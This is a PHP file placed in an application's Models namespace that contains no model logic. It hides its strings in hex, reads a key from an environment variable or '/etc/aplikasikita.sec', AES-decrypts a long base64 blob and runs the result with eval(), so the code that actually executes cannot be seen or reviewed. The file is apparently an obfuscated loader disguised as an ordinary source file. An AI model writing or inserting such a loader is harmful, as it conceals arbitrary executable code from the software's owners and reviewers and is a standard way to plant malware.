<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('iLEvdXJrfwLXrcQonPAk6g==');

$c=base64_decode(

'PqPGqWlxh3v7xHc4uvrvmVc74M1ZNdUOy5z8STo7/fmwzumT62XlKa9KdtBksljZDDAvA6cjuzI1' .
'ieLzx70xIJ4kfytjOgh60dCL7SEMSf8d/pd20/iD0qlJNZT093Uya3J7Az7qlEn6N/ex14cCB6Wl' .
't5jzmoQMFQKDgw04vPNEv5hK+QgV6z0wvcortnb5Cr463xA43a03ptcsJOQDJ1ThYSfSDbVh9nk8' .
'OCiv4whynVEYQigricxQXOXtWV9uPksOrtCz1vef+L3mRr5MxdO+H0wDl3TEdWx/1pQKZXVuk+nw' .
'9DZIgmbOEaP5o5it6h7nhQD+8PmjSJyeqlcpbhuAXi9BST1Wi1sQF4Rl7ROMxDNLRu76LWn/x0kx' .
'yyjKSKfezvdyU+UoR3a4Rxyhoo0vZ+3ucwzets+cKK0eg1oFq8dD/F7L6gTWu/eyvurRimrC938F' .
'LbWEoTbhf8whSPrfC/oF6EVGI4iwkZfNRG0hksw4T7ZB8umJ1nyFp39JkvgsncoAPeA3K1zKbSeu' .
'C9MmpvlfHikvEKKP0hY1veB4BQ3BdxbVk2TQpovRNypaRaaMokj8YQ2yoXP8lgfu9PcDoShX5ffG' .
'2AZaAmcg5a5oGQW+vqYvwE+RCt+uOUUzAW+7uKG2FlUUUrV4+tC3AoZx4T4ReoDiaqpqkp62QXMt' .
'smeKSBbf0IHTMY74Cp8f2B7PC2VRWe5lLzJFFI4qxY83upqLXjDclLoKZXu51phGjlTotkvWWAjK' .
'T6mVip3C34dzPMCevNXM1IvJIyGvHi+tkRqmGpOT8PUDuyYrggSs7JymNrQV1bFwADsbEAMzVUlk' .
'S1C/tpkQAxLVTfnDWZmFSZ2DpKacF3RZMEEQmzNi26HMgrrdVSfVfuMqd3jI6J6pEHCN76YPCadw' .
'1lOyLg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

